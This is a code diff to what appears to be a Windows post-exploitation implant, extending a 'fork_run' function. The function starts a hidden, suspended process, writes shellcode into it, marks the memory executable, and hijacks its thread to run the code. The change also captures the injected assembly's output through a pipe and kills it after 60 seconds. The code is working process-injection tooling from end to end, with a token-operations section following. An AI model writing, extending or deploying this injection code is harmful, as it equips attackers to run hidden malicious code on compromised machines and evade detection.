@@ -1363,23 +1363,119 @@ static char *fork_run(const char *cmd, const uint8_t *sc, size_t sc_len) {
     }
     WCHAR proc_w[MAX_PATH];
     MultiByteToWideChar(CP_ACP, 0, proc_path, -1, proc_w, MAX_PATH);
+
+    /* Pipe to capture stdout/stderr of the Donut-hosted assembly. */
+    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+    HANDLE out_rd = INVALID_HANDLE_VALUE, out_wr = INVALID_HANDLE_VALUE;
+    BOOL piped = CreatePipe(&out_rd, &out_wr, &sa, 0);
+    if (piped) SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);
+
     STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
-    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
-    if (!CreateProcessW(NULL, proc_w, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        char *e=(char*)malloc(128); snprintf(e,128,"CreateProcessW(%s) failed (err %lu)",proc_path,GetLastError()); return e;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = 0;
+    if (piped) {
+        si.dwFlags |= STARTF_USESTDHANDLES;
+        si.hStdInput  = NULL;
+        si.hStdOutput = out_wr;
+        si.hStdError  = out_wr;
     }
+
+    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
+    if (!CreateProcessW(NULL, proc_w, NULL, NULL, piped ? TRUE : FALSE,
+                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        if (piped) { CloseHandle(out_rd); CloseHandle(out_wr); }
+        char *e = (char*)malloc(128);
+        snprintf(e, 128, "CreateProcessW(%s) failed (err %lu)", proc_path, GetLastError());
+        return e;
+    }
+    if (piped) CloseHandle(out_wr); /* parent closes write end so ReadFile sees EOF on child exit */
+
     LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
-    if (!mem) { TerminateProcess(pi.hProcess,1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return strdup("VirtualAllocEx failed"); }
+    if (!mem) {
+        TerminateProcess(pi.hProcess, 1); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+        if (piped) CloseHandle(out_rd);
+        return _strdup("VirtualAllocEx failed");
+    }
     SIZE_T wr;
     WriteProcessMemory(pi.hProcess, mem, sc, sc_len, &wr);
     DWORD old; VirtualProtectEx(pi.hProcess, mem, sc_len, PAGE_EXECUTE_READ, &old);
     CONTEXT ctx; memset(&ctx, 0, sizeof(ctx)); ctx.ContextFlags = CONTEXT_CONTROL;
     if (GetThreadContext(pi.hThread, &ctx)) { ctx.Rip = (DWORD64)mem; SetThreadContext(pi.hThread, &ctx); }
     ResumeThread(pi.hThread);
-    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
-    char *out = (char*)malloc(192);
-    snprintf(out, 192, "[+] fork-run: %zu B shellcode in %s (PID=%lu)", sc_len, proc_path, (unsigned long)pi.dwProcessId);
-    return out;
+    CloseHandle(pi.hThread);
+
+    if (!piped) {
+        /* Pipe setup failed — fire-and-forget fallback */
+        CloseHandle(pi.hProcess);
+        char *out = (char*)malloc(192);
+        snprintf(out, 192, "[+] fork-run: %zu B shellcode in %s (PID=%lu)", sc_len, proc_path, (unsigned long)pi.dwProcessId);
+        return out;
+    }
+
+    /* ── Drain output pipe with 60s timeout ─────────────────────────────── */
+    char  *output  = NULL;
+    size_t out_len = 0, out_cap = 0;
+    BYTE   buf[8192];
+    DWORD  deadline = GetTickCount() + 60000;
+
+    while (GetTickCount() < deadline) {
+        DWORD avail = 0;
+        if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL)) break;
+        if (avail > 0) {
+            DWORD nr = 0;
+            ReadFile(out_rd, buf, min(avail, (DWORD)sizeof(buf)), &nr, NULL);
+            if (nr > 0) {
+                if (out_len + nr >= out_cap) {
+                    out_cap = out_len + nr + 4096;
+                    char *tmp = (char*)realloc(output, out_cap + 1);
+                    if (!tmp) break;
+                    output = tmp;
+                }
+                memcpy(output + out_len, buf, nr);
+                out_len += nr;
+            }
+        } else {
+            if (WaitForSingleObject(pi.hProcess, 50) != WAIT_TIMEOUT) {
+                while (1) {
+                    avail = 0;
+                    if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL) || avail == 0) break;
+                    DWORD nr = 0;
+                    ReadFile(out_rd, buf, min(avail, (DWORD)sizeof(buf)), &nr, NULL);
+                    if (nr == 0) break;
+                    if (out_len + nr >= out_cap) {
+                        out_cap = out_len + nr + 4096;
+                        char *tmp = (char*)realloc(output, out_cap + 1);
+                        if (!tmp) break;
+                        output = tmp;
+                    }
+                    memcpy(output + out_len, buf, nr);
+                    out_len += nr;
+                }
+                break;
+            }
+        }
+    }
+    CloseHandle(out_rd);
+
+    int timed_out = (GetTickCount() >= deadline);
+    if (timed_out) TerminateProcess(pi.hProcess, 1);
+    WaitForSingleObject(pi.hProcess, 5000);
+
+    const char *marker = timed_out ? "\n[!] fork-run: timed out (60s)" : NULL;
+    if (marker) {
+        size_t mlen = strlen(marker);
+        if (out_len + mlen >= out_cap) {
+            out_cap = out_len + mlen + 1;
+            char *tmp = (char*)realloc(output, out_cap + 1);
+            if (tmp) output = tmp; else marker = NULL;
+        }
+        if (marker && output) { memcpy(output + out_len, marker, mlen); out_len += mlen; }
+    }
+    CloseHandle(pi.hProcess);
+
+    if (!output || out_len == 0) { free(output); return _strdup("(no output)"); }
+    output[out_len] = '\0';
+    return output;
 }
 
 // ── Token operations ──────────────────────────────────────────────────────────
